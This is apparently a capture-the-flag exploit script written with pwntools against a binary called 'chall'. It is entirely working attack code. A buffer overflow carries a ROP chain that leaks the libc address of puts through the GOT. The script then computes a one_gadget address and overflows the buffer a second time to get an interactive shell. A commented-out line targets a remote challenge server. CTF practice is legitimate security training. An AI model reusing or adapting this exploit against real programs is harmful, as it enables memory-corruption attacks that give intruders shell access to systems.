from pwn import *

r = process(["./chall"])
#r = remote('challs.htsp.ro', 8001)
main = b"a"*16+p64(0x00000000004008f3)+p64(0x601018)+p64(0x400600)+p64(0x400767)+p64(0x6161616161616161)
r.sendline((main+b"\n")*3+b"done\n")
res = r.recvuntil(b"\nWrite").split(b"\n")[1].ljust(8,b"\x00")
print(res)
puts = u64(res)
print(puts)
go = puts - 0x80970 + 0x4f302
main = b"a"*16+p64(go)+p64(go)
r.sendline((main+b"\n")*3+b"done\n")

r.interactive()
